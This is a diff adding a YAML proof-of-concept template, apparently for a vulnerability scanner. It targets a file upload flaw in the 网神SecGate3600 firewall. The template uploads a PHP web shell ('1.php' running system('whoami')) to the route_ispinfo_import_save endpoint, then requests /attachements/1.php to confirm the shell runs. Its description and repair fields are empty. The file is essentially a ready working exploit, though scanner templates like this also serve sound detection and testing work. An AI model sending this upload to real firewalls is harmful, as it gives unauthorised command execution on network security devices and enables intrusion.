@@ -1,0 +1,43 @@
+id:
+
+info:
+  name: 网神SecGate3600 防火墙 route_ispinfo_import_save 文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /?g=route_ispinfo_import_save
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+  data: |
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+    10000000
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="reqfile"; filename="1.php"
+    Content-Type: text/plain
+
+    <?php system("whoami");?>
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="submit_post"
+
+    route_ispinfo_import_save
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+response1:
+  headers:
+  body:
+  code:
+requests2:
+  method: GET
+  path: /attachements/1.php
+response2:
+  headers:
+  body:
+  code: 200
+
+
+
+
